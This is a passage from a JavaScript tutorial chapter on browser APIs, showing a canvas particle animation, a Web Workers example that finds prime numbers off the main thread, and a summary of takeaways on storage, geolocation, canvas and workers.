      constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.vx = (Math.random() - 0.5) * 2;
        this.vy = (Math.random() - 0.5) * 2;
        this.radius = Math.random() * 3 + 1;
        this.color = `hsl(${Math.random() * 360}, 50%, 50%)`;
      }
      
      update() {
        this.x += this.vx;
        this.y += this.vy;
        
        // Bounce off edges
        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
      }
      
      draw() {
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
        ctx.fillStyle = this.color;
        ctx.fill();
      }
    }
    
    // Create particles
    const particles = [];
    for (let i = 0; i < 100; i++) {
      particles.push(new Particle());
    }
    
    // Animation loop
    function animate() {
      // Clear canvas with fade effect
      ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      // Update and draw particles
      particles.forEach(particle => {
        particle.update();
        particle.draw();
      });
      
      requestAnimationFrame(animate);
    }
    
    animate();
    
    // Resize canvas on window resize
    window.addEventListener('resize', () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    });
  </script>
</body>
</html>
```

---

## 9.4 Web Workers

**Purpose:** Run JavaScript in background threads (doesn't block UI).

**Why Use Web Workers:**
- Heavy computations don't freeze UI
- Parallel processing
- Better performance for intensive tasks

**Basic Setup:**

**main.js:**
```javascript
// Create worker
const worker = new Worker('worker.js');

// Send data to worker
worker.postMessage({ numbers: [1, 2, 3, 4, 5] });

// Receive data from worker
worker.addEventListener('message', (e) => {
  console.log('Result from worker:', e.data);
});

// Handle errors
worker.addEventListener('error', (e) => {
  console.error('Worker error:', e.message);
});

// Terminate worker
// worker.terminate();
```

**worker.js:**
```javascript
// Listen for messages
self.addEventListener('message', (e) => {
  const numbers = e.data.numbers;
  
  // Perform heavy computation
  const sum = numbers.reduce((a, b) => a + b, 0);
  
  // Send result back
  self.postMessage({ sum: sum });
});
```

**Complete Example:**

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Web Workers Demo</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 800px;
      margin: 50px auto;
      padding: 20px;
    }
    
    .demo {
      background: #f5f5f5;
      padding: 20px;
      margin: 20px 0;
      border-radius: 8px;
    }
    
    button {
      padding: 10px 20px;
      margin: 5px;
      background: #0066cc;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }
    
    .result {
      margin-top: 15px;
      padding: 15px;
      background: white;
      border: 1px solid #ddd;
      border-radius: 4px;
    }
    
    .loading {
      color: #666;
      font-style: italic;
    }
  </style>
</head>
<body>
  <h1>Web Workers Demo</h1>
  
  <div class="demo">
    <h2>Without Web Worker (Blocks UI)</h2>
    <button onclick="calculateWithoutWorker()">Calculate Prime Numbers</button>
    <p class="loading" id="status1">Click button to start</p>
    <div class="result" id="result1"></div>
  </div>
  
  <div class="demo">
    <h2>With Web Worker (Doesn't Block UI)</h2>
    <button onclick="calculateWithWorker()">Calculate Prime Numbers</button>
    <p class="loading" id="status2">Click button to start</p>
    <div class="result" id="result2"></div>
  </div>
  
  <div class="demo">
    <p>Try clicking buttons and scrolling - notice the difference!</p>
    <p>Without worker: Page freezes during calculation</p>
    <p>With worker: Page remains responsive</p>
  </div>
  
  <script>
    // Function to find prime numbers (intensive task)
    function findPrimes(max) {
      const primes = [];
      
      for (let i = 2; i <= max; i++) {
        let isPrime = true;
        for (let j = 2; j <= Math.sqrt(i); j++) {
          if (i % j === 0) {
            isPrime = false;
            break;
          }
        }
        if (isPrime) primes.push(i);
      }
      
      return primes;
    }
    
    // Without Web Worker (blocks UI)
    function calculateWithoutWorker() {
      document.getElementById('status1').textContent = 'Calculating... (UI is frozen)';
      document.getElementById('result1').textContent = '';
      
      // Simulate heavy computation
      setTimeout(() => {
        const start = performance.now();
        const primes = findPrimes(100000);
        const end = performance.now();
        
        document.getElementById('status1').textContent = 'Done!';
        document.getElementById('result1').textContent = 
          `Found ${primes.length} primes in ${(end - start).toFixed(2)}ms`;
      }, 100);
    }
    
    // With Web Worker (doesn't block UI)
    function calculateWithWorker() {
      document.getElementById('status2').textContent = 'Calculating... (UI still responsive!)';
      document.getElementById('result2').textContent = '';
      
      // Create worker from inline code
      const workerCode = `
        self.addEventListener('message', (e) => {
          const max = e.data.max;
          const start = performance.now();
          const primes = [];
          
          for (let i = 2; i <= max; i++) {
            let isPrime = true;
            for (let j = 2; j <= Math.sqrt(i); j++) {
              if (i % j === 0) {
                isPrime = false;
                break;
              }
            }
            if (isPrime) primes.push(i);
          }
          
          const end = performance.now();
          
          self.postMessage({
            count: primes.length,
            time: end - start
          });
        });
      `;
      
      const blob = new Blob([workerCode], { type: 'application/javascript' });
      const worker = new Worker(URL.createObjectURL(blob));
      
      worker.postMessage({ max: 100000 });
      
      worker.addEventListener('message', (e) => {
        document.getElementById('status2').textContent = 'Done!';
        document.getElementById('result2').textContent = 
          `Found ${e.data.count} primes in ${e.data.time.toFixed(2)}ms`;
        worker.terminate();
      });
    }
  </script>
</body>
</html>
```

---

## Key Takeaways from Chapter 9

### Storage:
1. **localStorage** - Persistent, survives browser restart
2. **sessionStorage** - Tab-specific, cleared when tab closes
3. **Always serialize objects** - Use JSON.stringify/parse
4. **Wrap in try-catch** - Storage can be full or disabled
5. **Never store sensitive data** - Vulnerable to XSS attacks

### Geolocation:
6. **Requires user permission** - Always handle denial
7. **getCurrentPosition** - One-time location
8. **watchPosition** - Continuous tracking
9. **enableHighAccuracy** - Use GPS for better accuracy
10. **Use for** - Store locators, weather, delivery tracking

### Canvas:
11. **2D graphics and animations** - getContext('2d')
12. **Drawing primitives** - Rectangles, circles, lines, paths
13. **Animation with requestAnimationFrame** - Smooth 60fps
14. **Use for** - Drawing apps, games, data visualizations

### Web Workers:
15. **Background threads** - Don't block UI
16. **postMessage** - Send data to/from worker
17. **No DOM access** - Workers can't access DOM
18. **Use for** - Heavy computations, data processing

### Best Practices:
19. **Check browser support** - Use feature detection
20. **Handle errors gracefully** - Always provide fallbacks

Master these APIs and you'll build modern, performant web applications! üöÄ